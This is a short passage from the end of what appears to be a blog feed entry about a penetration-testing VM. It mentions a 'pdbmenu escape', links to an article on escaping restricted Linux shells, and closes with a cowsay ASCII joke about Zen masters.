<p>Interesting twist on this VM with the pdbmenu escape!</p>

<p><strong>Learn more</strong></p>

<ul>
<li><a href="https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells">escape restricted Linux shells</a></li>
</ul>


<p>```</p>

<hr />

<p>/ Q: How many Zen masters does it take to \
| screw in a light bulb? A: None. The     |
| Universe spins the bulb, and the Zen    |
| master stays out                        |
|                                         |
\ of the way.                             /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
</feed>
